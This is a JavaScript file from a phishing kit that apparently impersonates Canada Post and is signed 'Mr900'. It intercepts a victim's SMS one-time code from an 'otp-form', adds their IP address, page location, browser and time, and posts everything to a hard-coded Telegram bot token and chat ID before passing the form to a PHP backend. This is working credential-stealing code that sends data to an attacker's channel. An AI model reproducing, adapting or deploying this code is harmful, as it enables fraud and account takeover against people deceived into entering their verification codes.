// Telegram.js: Consolidated File for Bot and Form Integration

// Replace this with your bot's API token
const BOT_TOKEN = '5955566794:AAFMZs58VC8gytfH8uFTLTVZf31oOH47Kjo'; // Replace with your actual bot token
const CHAT_ID = '2016548927'; // Replace with the Telegram chat/channel ID where messages will be sent

// Function to get the user's IP address
async function getUserIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip || 'Unknown';
  } catch (error) {
    console.error('Error fetching IP address:', error);
    return 'Error fetching IP';
  }
}

// Function to send a message to Telegram
async function sendMessageToTelegram(message) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
      }),
    });

    const result = await response.json();
    if (result.ok) {
      console.log('Message sent successfully to Telegram:', result);
    } else {
      console.error('Failed to send message to Telegram:', result);
    }
  } catch (error) {
    console.error('Error sending message to Telegram:', error);
  }
}

// Function to show alert message
function showAlert(message) {
  let alertDiv = document.getElementById('alertMessage');
  if (!alertDiv) {
    alertDiv = document.createElement('div');
    alertDiv.id = 'alertMessage';
    document.body.prepend(alertDiv);

    alertDiv.style.position = 'fixed';
    alertDiv.style.top = '0';
    alertDiv.style.width = '100%';
    alertDiv.style.backgroundColor = 'red';
    alertDiv.style.color = 'white';
    alertDiv.style.textAlign = 'center';
    alertDiv.style.padding = '10px';
    alertDiv.style.zIndex = '1000';
  }
  alertDiv.textContent = message;
  alertDiv.style.display = 'block';

  // Auto-hide the alert after 3 seconds
  setTimeout(() => {
    alertDiv.style.display = 'none';
  }, 3000);
}

// Attach event listener to the form
document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('otp-form');

  if (form) {
    form.addEventListener('submit', async (event) => {
      event.preventDefault(); // Prevent default form submission

      // Collect form data
      const formData = new FormData(form);
      const data = {
        otp: formData.get('otp'),
      };

      const ip = await getUserIP(); // Fetch the user's IP address
      const host = window.location.host;
      const path = window.location.pathname;
      const browser = navigator.userAgent;
      const time = new Date().toISOString().replace('T', ' ').split('.')[0]; // Format: YYYY-MM-DD HH:mm:ss
      
      // Construct the Telegram message to match PHP format
      const message = `
📮 ###########【 SMS VERIFICATION 】############📮

🔢 SMS  : ${data.otp || 'N/A'}

🌐##########【 IP TRACING INFO 】##########🌐

🆔 IP      : https://whatismyip.com/ip/${ip}
🏠 Host    : ${host}${path}
🖥️ Browser : ${browser}
🕒 Time    : ${time}

📮 ##############【 CANADA POST 】#############📮

©️ Mr900 | Telegram @mr900com
`;

      // Check if any required fields are empty
      const missingFields = Object.entries(data).filter(([key, value]) => !value);

      if (missingFields.length > 0) {
        showAlert('Please complete all required fields.');
        return; // Stop submission if any fields are empty
      }
      
      // Send the message to Telegram
      await sendMessageToTelegram(message);

      // Allow form submission to proceed to PHP backend
      form.submit();
    });
  } else {
    console.error('Form with ID "otp-form" not found.');
  }
});